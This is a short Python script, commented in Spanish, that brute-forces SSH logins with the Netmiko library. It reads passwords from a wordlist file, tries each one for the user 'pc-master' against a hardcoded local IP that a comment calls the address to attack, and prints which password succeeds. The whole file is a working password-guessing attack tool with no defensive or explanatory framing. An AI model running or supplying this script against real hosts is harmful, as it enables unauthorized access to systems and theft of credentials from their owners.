#Netmiko

from netmiko import ConnectHandler
from netmiko import Netmiko

def admin(ip,passw):
	try:
		conex = Netmiko(host=ip,username="pc-master",  password=passw, device_type="linux") # creo una conexion y la guardo en la variable conex
		conex.disconnect() # desconecto la sesion ssh
		print("CONEXION EXITOSA!")
		print(" ")
		print("------------------------------------------------------------------------")
		print(" ")
		print("Usuario: pc-master")
		print(f"Contraseña: {passw} -- CORRECTA!")
		print(" ")
		print("-----------------------------------------------------------------------")
		print("")
		print(f"La contraseña es: {passw}")
		print(" ")
		input("GRACIAS POR USAR NUESTRO PROGRAMA, VUELVA PRONTO!")
	except:
		print("Usuario: pc-master")
		print(f"Contraseña: {passw} -- ERRONEA!")
		print(" ")

archivo = open("pass.txt", "r") #En lugar de pass.txt indique el nombre de la wordlist
contraseñas = archivo.read().splitlines()

direccion_ip = "192.168.0.19" #Indique la direccion ip a atacar

for i in contraseñas:
	admin(direccion_ip,i)
